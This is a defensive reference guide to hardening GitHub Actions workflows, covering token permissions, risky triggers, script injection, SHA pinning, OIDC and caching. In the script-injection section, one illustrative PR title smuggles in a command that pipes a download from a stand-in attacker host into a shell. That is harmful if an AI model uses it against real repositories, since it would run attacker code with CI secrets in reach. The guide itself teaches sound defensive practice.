# GitHub Actions hardening

Reference for the `devops` skill. The short gate before publishing a repository is `/artel:secure-publish`; this file is the full version.

In the examples, `<full-commit-sha>` stands for the 40-character commit SHA of the release you reviewed. Look it up on the action's releases/tags page (or `git ls-remote --tags https://github.com/<owner>/<repo>`), then keep the tag in a comment so Dependabot can update both.

## Hardened CI + deploy template

```yaml
name: ci

on:
  pull_request:
  push:
    branches: [main]

permissions:
  contents: read            # default for every job; widen per job only

concurrency:
  group: ci-${{ github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}

jobs:
  test:
    runs-on: ubuntu-latest
    timeout-minutes: 20
    steps:
      - uses: actions/checkout@<full-commit-sha>        # vX.Y.Z
        with:
          persist-credentials: false
      - uses: actions/setup-node@<full-commit-sha>      # vX.Y.Z
        with:
          node-version-file: .nvmrc
          cache: npm
      - run: npm ci
      - run: npm test

  deploy:
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    needs: test
    runs-on: ubuntu-latest
    timeout-minutes: 30
    environment: production   # required reviewers + branch restriction configured in Settings → Environments
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    permissions:
      contents: read
      id-token: write         # OIDC token for the cloud role; nothing else
    steps:
      - uses: actions/checkout@<full-commit-sha>        # vX.Y.Z
        with:
          persist-credentials: false
      - uses: aws-actions/configure-aws-credentials@<full-commit-sha>   # vX.Y.Z
        with:
          role-to-assume: ${{ vars.AWS_DEPLOY_ROLE_ARN }}
          aws-region: ${{ vars.AWS_REGION }}
      - run: ./scripts/deploy.sh
```

## 1. Token permissions

- Set `permissions: contents: read` at the top of **every** workflow, and in repository/organisation settings set the default `GITHUB_TOKEN` permission to read-only.
- Grant extra scopes per job: `pull-requests: write` (comment), `packages: write` (push to GHCR), `id-token: write` (OIDC), `contents: write` (release/tag), `security-events: write` (upload SARIF). Any scope not listed becomes `none` once a `permissions` block exists.
- Pull requests from forks always get a read-only token and no secrets (except `GITHUB_TOKEN`) — this is a protection, not a bug to work around.

## 2. Dangerous triggers

- `pull_request_target` runs in the context of the **base** repository with secrets and a write-capable token. It is safe only when the workflow never checks out, builds, installs or runs code from the PR (e.g. labelling, commenting with static data). Never combine it with `actions/checkout` of `github.event.pull_request.head.sha`/`head.ref` or with `npm install`/`make` on PR content.
- `workflow_run` triggered by a PR workflow is privileged too: treat downloaded artifacts as untrusted data (don't execute them, validate contents, extract outside the workspace).
- `issue_comment` triggers (`/deploy` bots) must check the commenter's permission (`author_association`, or the collaborators API) and still never check out PR code with secrets in scope.
- Need to test fork PRs with secrets? Use `pull_request` (no secrets) for the untrusted part and a separate, privileged workflow that only consumes its results as data — or require a maintainer to approve via an environment.

## 3. Script injection

Any `${{ … }}` expression is substituted into the script **before** the shell runs, so attacker-controlled text becomes code. Untrusted contexts include `github.event.issue.title`/`body`, `github.event.pull_request.title`/`body`/`head.ref`, `github.event.comment.body`, `github.event.review.body`, `github.event.commits.*.message`, `github.event.head_commit.message`/`author.*`, `github.head_ref`, and step outputs derived from them.

```yaml
# VULNERABLE: a PR titled  a"; curl https://attacker.example/x | sh; echo "  runs code
- run: echo "Checking ${{ github.event.pull_request.title }}"

# SAFE: expression goes into an env var; the shell expands a quoted variable
- run: echo "Checking $PR_TITLE"
  env:
    PR_TITLE: ${{ github.event.pull_request.title }}
```

The same applies to `actions/github-script` (`script:` is JavaScript — read from `context`/`process.env` instead of interpolating) and to `with:` inputs that an action passes to a shell. Never write untrusted values to `GITHUB_ENV` or `GITHUB_PATH` (lets them set variables like `LD_PRELOAD`/`NODE_OPTIONS` for later steps).

## 4. Pin actions to full SHAs

- Tags and branches are mutable; a compromised or retagged action runs with your secrets. Pin **third-party** actions to a full 40-character commit SHA (short SHAs are not accepted as a pin) with a version comment; pinning first-party `actions/*` too is consistent and cheap.
- Check that the SHA belongs to the action's own repository, not a fork.
- Keep pins current with Dependabot:

  ```yaml
  # .github/dependabot.yml
  version: 2
  updates:
    - package-ecosystem: github-actions
      directory: /
      schedule:
        interval: weekly
  ```

- Tools such as `pinact` or `ratchet` convert tag references to SHA pins in bulk.
- Prefer few, well-maintained actions; a three-line `run:` step is often safer than an unknown action. Pin Docker-based actions and `container:` images by digest.
- Organisation/repository settings can restrict which actions are allowed to run.

## 5. OIDC instead of long-lived cloud keys

Grant `id-token: write` to the deploy job only; the cloud trusts GitHub's OIDC issuer and issues short-lived credentials.

| Cloud | Action | Inputs |
|---|---|---|
| AWS | `aws-actions/configure-aws-credentials` | `role-to-assume`, `aws-region` |
| Google Cloud | `google-github-actions/auth` | `workload_identity_provider`, `service_account` (or direct WIF) |
| Azure | `azure/login` | `client-id`, `tenant-id`, `subscription-id` (federated credential) |

Restrict the trust policy by the token's `sub` claim — e.g. `repo:<owner>/<repo>:environment:production` or `repo:<owner>/<repo>:ref:refs/heads/main` — never just the organisation or `repo:<owner>/*`. Also check `aud`. Delete the old access keys from secrets once OIDC works.

## 6. Environments and secrets

- Production deploy jobs use `environment: production` with **required reviewers**, "prevent self-review", and deployment branches limited to `main` (or release tags).
- Put production secrets in the environment, not at repository level, so only approved jobs can read them.
- Non-secret config in `vars`, not secrets (secrets are masked in logs, making debugging harder, and masking is not a security boundary).
- Don't echo secrets, don't use `set -x` in steps that handle them, and don't pass them to steps that run untrusted code. Masking fails for transformed values (base64, JSON fragments) — call `::add-mask::` for derived secrets.

## 7. Checkout and runners

- `actions/checkout` stores the token in `.git/config` by default; `persist-credentials: false` unless a later step pushes.
- Self-hosted runners: never on public repositories (any fork PR can run code on them); use ephemeral, isolated runners; don't share runners across trust levels.
- `timeout-minutes` on every job; default is 360.

## 8. Caching safely

- Key caches on lockfile hashes: `key: ${{ runner.os }}-npm-${{ hashFiles('**/package-lock.json') }}` with `restore-keys` prefix fallbacks.
- Cache scoping: a run can restore caches from its own branch and the default branch; PR caches are isolated to the PR ref. Untrusted code that runs on the default branch (e.g. in a `pull_request_target` job) can poison caches used by releases.
- Release and publish workflows: build from a clean state or restore only caches you trust; never cache credential files.
- Docker: `docker/build-push-action` with `cache-from: type=gha` and `cache-to: type=gha,mode=max`.

## 9. Supply chain extras

- Build provenance / attestations (`actions/attest-build-provenance`) and `npm publish --provenance` for packages.
- Branch protection or rulesets: required checks, reviews, no force-push on `main`; `CODEOWNERS` entry for `.github/workflows/` and `.github/actions/`.
- Lint every workflow change: `actionlint` (syntax, expressions, shellcheck of `run:`) and `zizmor` (security: injection, `pull_request_target`, unpinned actions, excessive permissions).
- Enable secret scanning and push protection; Dependabot alerts for dependencies.

## Review checklist

- [ ] Top-level `permissions: contents: read`; job-level widening is minimal and justified.
- [ ] No `pull_request_target`/`workflow_run` job checks out or executes PR code; artifacts from untrusted runs treated as data.
- [ ] No untrusted `${{ github.event.* }}` / `github.head_ref` inside `run:` or `script:`; values passed via `env:` and quoted.
- [ ] All actions pinned to full SHAs with version comments; Dependabot updates `github-actions`.
- [ ] Cloud access via OIDC with a tightly scoped `sub`; no long-lived keys.
- [ ] Production jobs use a protected environment with required reviewers and branch restrictions.
- [ ] `persist-credentials: false`, `timeout-minutes`, `concurrency` for deploys.
- [ ] Caches keyed on lockfiles; no credentials cached; release builds don't trust PR-writable caches.
